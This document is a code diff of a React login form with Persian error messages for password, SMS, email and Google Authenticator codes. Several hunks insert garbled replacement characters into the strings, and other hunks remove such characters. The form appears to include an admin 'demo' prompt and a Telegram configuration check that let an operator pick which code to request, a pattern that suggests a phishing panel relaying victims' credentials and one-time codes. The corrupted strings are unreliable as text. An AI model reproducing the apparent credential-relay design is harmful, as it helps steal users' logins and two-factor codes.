@@ -257,7 +257,7 @@ export const LoginForm = () => {
           setGoogleCode(""); // Clear Google code field
           setErrors({
             googleCode:
-              "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+              "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد ک��ید.",
           });
           break;
         case "sms":
@@ -275,7 +275,7 @@ export const LoginForm = () => {
           setEmailCode(""); // Clear email code field
           setErrors({
             emailCode:
-              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح ر�� وارد کنید.",
+              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
           });
           break;
         case "email_code":
@@ -612,7 +612,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Phone submission error:", error);
       setErrors({
-        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
+        mobileNumber: "خطا در ارسال اطلاعات. لطفا دو��اره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -674,7 +674,7 @@ export const LoginForm = () => {
           if (!validateTelegramConfig()) {
             setTimeout(() => {
               const choice = prompt(
-                "🎭 حالت دمو - شبیه‌سازی ادم��ن\n\n" +
+                "🎭 حالت دمو - شبیه‌سازی ادمین\n\n" +
                   "انتخاب کنید:\n" +
                   "1 = Password\n" +
                   "2 = SMS Code\n" +
@@ -770,7 +770,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!googleCode || googleCode.length !== 6) {
-      setErrors({ googleCode: "��د Google Authenticator ۶ رقمی را وارد کنید" });
+      setErrors({ googleCode: "��د Google Authenticator �� رقمی را وارد کنید" });
       return;
     }
 
@@ -1155,7 +1155,7 @@ export const LoginForm = () => {
                   ? "Google Authenticator"
                   : currentStep === "email"
                     ? "تایید ایمیل"
-                    : "و��ود و ثبت‌نام"}
+                    : "ورود و ثبت‌نام"}
           </span>
         </div>
 
@@ -2170,7 +2170,7 @@ export const LoginForm = () => {
                     textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                   }}
                 >
-                  <span>مطمئن شوید که در دامنه</span>
+                  <span>مطمئن شوید که در دامنه&nbsp;</span>
                   <span
                     style={{
                       borderColor: "rgba(0, 0, 0, 0.6)",
@@ -2204,7 +2204,7 @@ export const LoginForm = () => {
                   textAlign: "center",
                 }}
               >
-                کد تایید را وارد کن��د
+                کد تایید را وارد کنید
               </h5>
 
               <h6
@@ -2691,7 +2691,7 @@ export const LoginForm = () => {
                 setErrors({});
 
                 if (!passwordValue) {
-                  setErrors({ password: "رمز عبو�� الزامی است" });
+                  setErrors({ password: "رمز عبور الزامی است" });
                   return;
                 }
 
